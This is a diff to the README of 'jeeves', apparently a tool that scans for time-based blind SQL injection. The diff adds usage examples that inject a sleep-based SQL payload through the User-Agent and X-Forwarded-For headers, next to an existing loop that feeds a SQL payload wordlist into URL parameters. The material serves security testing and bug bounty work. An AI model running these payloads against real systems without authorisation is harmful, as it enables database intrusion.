@@ -115,10 +115,18 @@ Using with sql payloads wordlist
 cat sql_wordlist.txt | while read payload;do echo http://testphp.vulnweb.com/artists.php?artist= | qsreplace $payload | jeeves -t 5;done
 ```
 
+Testing in headers
+
+```bash
+echo "https://target.com" | jeeves -H "User-Agent: 'XOR(if(now()=sysdate(),sleep(5*2),0))OR'" -t 10
+echo "https://target.com" | jeeves -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(5*2),0))OR'" -t 10
+
+Payload credit: https://github.com/rohit0x5
+```
+
 OBS: 
 * Does not follow redirects, If the Status Code is diferent than 200, it returns "Need Manual Analisys"
 * Jeeves does not http probing, he is not able to do requests to urls that does not contain protocol ( http://, https:// )
-
 <br>
 
 ## This project is for educational and bug bounty porposes only! I do not support any illegal activities!.
